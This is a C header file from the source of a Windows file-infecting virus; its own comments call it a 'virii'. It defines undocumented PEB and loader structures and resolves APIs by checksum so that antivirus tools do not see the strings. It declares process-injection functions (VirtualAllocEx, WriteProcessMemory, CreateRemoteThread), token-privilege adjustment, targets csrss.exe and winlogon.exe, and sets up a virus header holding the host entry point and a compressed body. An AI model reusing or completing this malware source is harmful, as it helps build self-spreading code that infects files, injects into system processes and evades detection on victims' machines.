#ifndef _64_absoluteH_
#define _64_absoluteH_

#include <windows.h>
#include <Ntsecapi.h>

// PEB and related structures
// (un-documented by Microsoft)

struct LIST_ENTRY
{
 struct LIST_ENTRY* Flink;
 struct LIST_ENTRY* Blink;
};

typedef struct _PEB_LDR_DATA
{
 ULONG Length;
 BYTE  bInitialized;
 PVOID SsHandle;
 LIST_ENTRY InLoadOrderModuleList;
 LIST_ENTRY InMemoryOrderModuleList;
 LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_MODULE {
 LIST_ENTRY  InLoadOrderModuleList;
 LIST_ENTRY  InMemoryOrderModuleList;
 LIST_ENTRY  InInitializationOrderModuleList;
 PVOID  BaseAddress;
 PVOID  EntryPoint;
 ULONG  SizeOfImage;
 UNICODE_STRING  FullDllName;
 UNICODE_STRING  BaseDllName;
 ULONG  Flags;
 SHORT  LoadCount;
 SHORT  TlsIndex;
 LIST_ENTRY  HashTableEntry;
 ULONG  TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

//
// PEB structure,there are more fields
// but this is enough for this virii
//
typedef struct _MYPEB
{
	BYTE  bInheritedAddressSpace;
	BYTE  bReadImageFileExecOptions;
	BYTE  bBeingDebugged;
	BYTE  bSpare;
	HANDLE hMutant;
	PVOID  ImageBaseAddress;
	PPEB_LDR_DATA LoaderData;
} MYPEB, *PMYPEB;

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)


//
//NTDLL.DLL API prototypes
//(un-documented by Microsoft)
//
typedef NTSYSAPI NTSTATUS NTAPI tRtlGetCompressionWorkSpaceSize ( IN USHORT CompressionFormatAndEngine, OUT PULONG CompressBufferWorkSpaceSize, OUT PULONG CompressFragmentWorkSpaceSize );
typedef NTSYSAPI NTSTATUS NTAPI tRtlCompressBuffer ( IN USHORT CompressionFormatAndEngine, IN PUCHAR UncompressedBuffer, IN ULONG UncompressedBufferSize, OUT PUCHAR CompressedBuffer, IN ULONG CompressedBufferSize, IN ULONG UncompressedChunkSize, OUT PULONG FinalCompressedSize, IN PVOID WorkSpace );
typedef NTSYSAPI NTSTATUS NTAPI tRtlDecompressBuffer ( IN USHORT CompressionFormat, OUT PUCHAR UncompressedBuffer,IN ULONG UncompressedBufferSize,IN PUCHAR CompressedBuffer, IN ULONG CompressedBufferSize, OUT PULONG FinalUncompressedSize );

#define RtlGetCompressionWorkSpaceSize_CSUM 0x00060B27
#define RtlCompressBuffer_CSUM 0x000319D3
#define RtlDecompressBuffer_CSUM 0x00037E3A

//
//Kernel32 API prototypes
//
typedef WINBASEAPI VOID WINAPI tSleep( __in DWORD dwMilliseconds );
typedef WINBASEAPI __out HMODULE WINAPI tLoadLibraryA( __in LPCSTR lpLibFileName );
typedef WINBASEAPI __out HMODULE WINAPI tGetModuleHandleA( __in_opt LPCSTR lpModuleName );
typedef WINBASEAPI __out HANDLE WINAPI tGetCurrentProcess( VOID );
typedef WINBASEAPI __out HANDLE WINAPI tOpenProcess( __in DWORD dwDesiredAccess, __in BOOL bInheritHandle, __in DWORD dwProcessId );
typedef WINBASEAPI BOOL WINAPI tCloseHandle( __in HANDLE hObject );
typedef WINBASEAPI __bcount(dwSize) LPVOID WINAPI tVirtualAlloc( __in_opt LPVOID lpAddress,__in SIZE_T dwSize,__in DWORD flAllocationType,__in DWORD flProtect );
typedef WINBASEAPI BOOL WINAPI tVirtualFree(__in LPVOID lpAddress,__in SIZE_T dwSize,__in DWORD dwFreeType );
typedef WINBASEAPI __bcount(dwSize) LPVOID WINAPI tVirtualAllocEx( __in HANDLE hProcess, __in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect );
typedef WINBASEAPI BOOL WINAPI tVirtualProtect( __in  LPVOID lpAddress, __in  SIZE_T dwSize, __in  DWORD flNewProtect, __out PDWORD lpflOldProtect );
typedef WINBASEAPI BOOL WINAPI tWriteProcessMemory( __in HANDLE hProcess, __in LPVOID lpBaseAddress, __in_bcount(nSize) LPCVOID lpBuffer, __in SIZE_T nSize, __out_opt SIZE_T * lpNumberOfBytesWritten );
typedef WINBASEAPI __out HANDLE WINAPI tCreateRemoteThread( __in HANDLE hProcess, __in_opt LPSECURITY_ATTRIBUTES lpThreadAttributes, __in SIZE_T dwStackSize, __in LPTHREAD_START_ROUTINE lpStartAddress, __in_opt LPVOID lpParameter, __in DWORD dwCreationFlags, __out_opt LPDWORD lpThreadId );
typedef WINBASEAPI __out HANDLE WINAPI tCreateFileA(__in LPCSTR lpFileName, __in DWORD dwDesiredAccess, __in DWORD dwShareMode, __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes, __in DWORD dwCreationDisposition, __in DWORD dwFlagsAndAttributes, __in_opt HANDLE hTemplateFile );
typedef WINBASEAPI __out HANDLE WINAPI tCreateFileMappingA( __in HANDLE hFile,__in_opt LPSECURITY_ATTRIBUTES lpFileMappingAttributes, __in DWORD flProtect, __in DWORD dwMaximumSizeHigh, __in DWORD dwMaximumSizeLow, __in_opt LPCSTR lpName );
typedef WINBASEAPI __out LPVOID WINAPI tMapViewOfFile(__in HANDLE hFileMappingObject,__in DWORD dwDesiredAccess,__in DWORD dwFileOffsetHigh,__in DWORD dwFileOffsetLow,__in SIZE_T dwNumberOfBytesToMap );
typedef WINBASEAPI BOOL WINAPI tUnmapViewOfFile(__in LPCVOID lpBaseAddress );
typedef WINBASEAPI DWORD WINAPI tGetFileSize( __in HANDLE hFile,__out_opt LPDWORD lpFileSizeHigh );
typedef WINBASEAPI __out HANDLE WINAPI tFindFirstFileA( __in  LPCSTR lpFileName, __out LPWIN32_FIND_DATAA lpFindFileData );
typedef WINBASEAPI BOOL WINAPI tFindNextFileA( __in HANDLE hFindFile, __out LPWIN32_FIND_DATAA lpFindFileData );
typedef WINBASEAPI BOOL WINAPI tFindClose( __inout HANDLE hFindFile );
typedef WINBASEAPI __out HANDLE WINAPI tOpenMutexA( __in DWORD dwDesiredAccess, __in BOOL bInheritHandle, __in LPCSTR lpName );
typedef WINBASEAPI __out HANDLE WINAPI tCreateMutexA( __in_opt LPSECURITY_ATTRIBUTES lpMutexAttributes, __in BOOL bInitialOwner, __in_opt LPCSTR lpName );
typedef WINBASEAPI BOOL WINAPI tReleaseMutex( __in HANDLE hMutex );
typedef WINBASEAPI DWORD WINAPI tGetLastError( VOID );
typedef WINBASEAPI FARPROC WINAPI tGetProcAddress ( __in HMODULE hModule, __in LPCSTR lpProcName );
typedef WINBASEAPI __out HANDLE WINAPI tGetCurrentThread( VOID );
typedef WINBASEAPI BOOL WINAPI tSetThreadPriority( __in HANDLE hThread, __in int nPriority );
typedef WINBASEAPI UINT WINAPI tGetSystemDirectoryA( __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer, __in UINT uSize );
typedef WINBASEAPI BOOL WINAPI tDeleteFileA( __in LPCSTR lpFileName );

typedef WINBASEAPI DECLSPEC_NORETURN VOID WINAPI tExitProcess( __in UINT uExitCode );

#define Sleep_CSUM 0x0000D22D
#define LoadLibraryA_CSUM 0x00026341
#define GetModuleHandleA_CSUM 0x0002E83E
#define GetCurrentProcess_CSUM 0x00033EB8
#define OpenProcess_CSUM 0x00022856
#define CloseHandle_CSUM 0x0002034C
#define VirtualAlloc_CSUM 0x00025090
#define VirtualFree_CSUM 0x0001EB8B
#define VirtualAllocEx_CSUM 0x0002C8D7
#define VirtualProtect_CSUM 0x0002D900
#define WriteProcessMemory_CSUM 0x0003CDAB
#define CreateRemoteThread_CSUM 0x0003A588
#define CreateFileA_CSUM 0x0002081A
#define CreateFileMappingA_CSUM 0x0003896D
#define MapViewOfFile_CSUM 0x00021FDE
#define UnmapViewOfFile_CSUM 0x00028E55
#define GetFileSize_CSUM 0x0001E662
#define FindFirstFileA_CSUM 0x00029EBC
#define FindNextFileA_CSUM 0x0002767A
#define FindClose_CSUM 0x0001ADD4
#define OpenMutexA_CSUM 0x0001FAF7
#define CreateMutexA_CSUM 0x00025561
#define ReleaseMutex_CSUM 0x0002786A
#define GetLastError_CSUM 0x00024F7D
#define GetProcAddress_CSUM 0x0002A3E7
#define GetCurrentThread_CSUM 0x00032747
#define SetThreadPriority_CSUM 0x00032ECC
#define GetSystemDirectoryA_CSUM 0x0003951D
#define DeleteFileA_CSUM 0x0001FF22
#define ExitProcess_CSUM 0x00023650

//
//User32 API prototypes
//
typedef WINUSERAPI int WINAPI tMessageBoxA( __in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType);
typedef WINUSERAPI int WINAPIV twsprintfA( __out LPSTR, __in __format_string LPCSTR, ...);

#define MessageBoxA_CSUM 0x0001FB41
#define wsprintfA_CSUM 0x0001BB0E

//
//PSAPI API prototypes
//
typedef BOOL WINAPI tEnumProcesses( DWORD * lpidProcess, DWORD   cb, DWORD * cbNeeded );
typedef BOOL WINAPI tEnumProcessModules( HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded );
typedef DWORD WINAPI tGetModuleBaseNameA( HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize );

#define EnumProcesses_CSUM 0x00028AD1
#define EnumProcessModules_CSUM 0x0003B6AC
#define GetModuleBaseNameA_CSUM 0x000336A2

//
//ADVAPI32 API prototypes
//
typedef WINADVAPI BOOL WINAPI tOpenProcessToken( __in HANDLE ProcessHandle, __in DWORD DesiredAccess, __deref_out PHANDLE TokenHandle );
typedef WINADVAPI BOOL WINAPI tLookupPrivilegeValueA( __in_opt LPCSTR lpSystemName, __in LPCSTR lpName, __out PLUID lpLuid );
typedef WINADVAPI BOOL WINAPI tAdjustTokenPrivileges( __in HANDLE TokenHandle, __in BOOL DisableAllPrivileges, __in_opt  PTOKEN_PRIVILEGES NewState, __in DWORD BufferLength, __out_bcount_part_opt(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,__out_opt PDWORD ReturnLength );

#define OpenProcessToken_CSUM 0x0003562F
#define LookupPrivilegeValueA_CSUM 0x00043048
#define AdjustTokenPrivileges_CSUM 0x0004118E

//
//In follow structures
//we keep addresses of functions
//

#define NumOfNtDllApis 3
typedef struct
{
 tRtlGetCompressionWorkSpaceSize *aRtlGetCompressionWorkSpaceSize;
 tRtlCompressBuffer   *aRtlCompressBuffer;
 tRtlDecompressBuffer *aRtlDecompressBuffer;
} NTDLL_APIS;


#define NumOfKernelApis 30
typedef struct
{
 tSleep              *aSleep;
 tLoadLibraryA       *aLoadLibraryA;
 tGetModuleHandleA   *aGetModuleHandleA;
 tGetCurrentProcess  *aGetCurrentProcess;
 tOpenProcess        *aOpenProcess;
 tCloseHandle        *aCloseHandle;
 tVirtualAlloc       *aVirtualAlloc;
 tVirtualFree        *aVirtualFree;
 tVirtualAllocEx     *aVirtualAllocEx;
 tVirtualProtect     *aVirtualProtect;
 tWriteProcessMemory *aWriteProcessMemory;
 tCreateRemoteThread *aCreateRemoteThread;
 tCreateFileA        *aCreateFileA;
 tCreateFileMappingA *aCreateFileMappingA;
 tMapViewOfFile      *aMapViewOfFile;
 tUnmapViewOfFile    *aUnmapViewOfFile;
 tGetFileSize        *aGetFileSize;
 tFindFirstFileA     *aFindFirstFileA;
 tFindNextFileA      *aFindNextFileA;
 tFindClose          *aFindClose;
 tOpenMutexA         *aOpenMutexA;
 tCreateMutexA       *aCreateMutexA;
 tReleaseMutex       *aReleaseMutex;
 tGetLastError       *aGetLastError; //this on is forwarded from kernel32.dll
 tGetProcAddress     *aGetProcAddress;
 tGetCurrentThread   *aGetCurrentThread;
 tSetThreadPriority  *aSetThreadPriority;
 tGetSystemDirectoryA *aGetSystemDirectoryA;
 tDeleteFileA        *aDeleteFileA;
 tExitProcess        *aExitProcess;
} KERNEL_APIS;

#define MEMALLOC(size) aVirtualAlloc( NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
#define MEMFREE(lpX) aVirtualFree(lpX,0,MEM_RELEASE)


#define NumOfUserApis 2
typedef struct
{
 tMessageBoxA *aMessageBoxA;
 twsprintfA   *awsprintfA;
} USER_APIS;


#define NumOfPSApis 3
typedef struct
{
 tEnumProcesses *aEnumProcesses;
 tEnumProcessModules *aEnumProcessModules;
 tGetModuleBaseNameA *aGetModuleBaseNameA;
} PS_APIS;

#define NumOfADVApis 3
typedef struct
{
 tOpenProcessToken *aOpenProcessToken;
 tLookupPrivilegeValueA *aLookupPrivilegeValueA;
 tAdjustTokenPrivileges *aAdjustTokenPrivileges;
} ADV_APIS;

typedef struct
{
 DWORD dwCompressedSectionLen;
 DWORD dwUnCompressedSectionLen;
 DWORD dwHostEntryRVA;
} VX_HEADER;

typedef struct
{
 DWORD dwUncompressedLen;
 DWORD dwCompressedLen;
 LPVOID lpCompressedBuffer;
} COMPRESSED_DATA;

extern void VirusEnd(void);
void PreGeneration2(void);
void Intruder(void);


//we dont want that AVers see this strings
#define csrss_exe_CSUM 0x00018E1B    //"csrss.exe"
#define winlogon_exe_CSUM 0x00027671 //"winlogon.exe"

#define COMPRESS_FORMAT_ENGINE (COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD)

#define Virus_Size ( (ULONGLONG)&VirusEnd - (ULONGLONG)&Virus_Header )
#define Virus_VA   ( (ULONGLONG)&Virus_Header )
#define Virus_Extra_Space 0x500

#endif